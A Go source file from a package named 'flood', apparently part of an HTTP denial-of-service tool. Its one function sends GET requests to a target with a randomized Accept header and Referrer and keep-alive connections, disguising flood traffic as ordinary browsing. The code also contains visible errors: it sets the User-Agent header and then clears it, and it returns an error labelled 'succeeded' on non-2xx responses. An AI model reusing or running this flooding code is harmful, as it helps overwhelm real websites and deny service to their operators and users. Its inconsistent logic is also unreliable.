package flood

import (
	"context"
	"errors"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

func (t *Target) performHttp(ctx context.Context, addr string) error {
	ctx, cancel := context.WithTimeout(ctx, time.Minute*5)
	defer cancel()

	method := "GET"

	request, err := http.NewRequestWithContext(ctx, method, addr, nil)
	if err != nil {
		return err
	}
	request.Header["Connection"] = []string{"Keep-Alive"}
	request.Header["User-Agent"] = []string{userAgent()}
	accept := acceptall[rand.Intn(len(acceptall))]
	request.Header["User-Agent"] = []string{}
	for _, l := range strings.Split(accept, "\r\n") {
		if l == "" {
			continue
		}
		h := strings.Split(l, ": ")
		request.Header.Add(h[0], h[1])
	}
	request.Header["Referrer"] = []string{referers[rand.Intn(len(referers))]}

	body, err := t.httpClient.Do(request)
	if err == nil {
		_, err = io.Copy(ioutil.Discard, body.Body)
		body.Body.Close()
		if body.StatusCode/100 != 2 {
			return errors.New("succeeded")
		}
	}
	return err
}
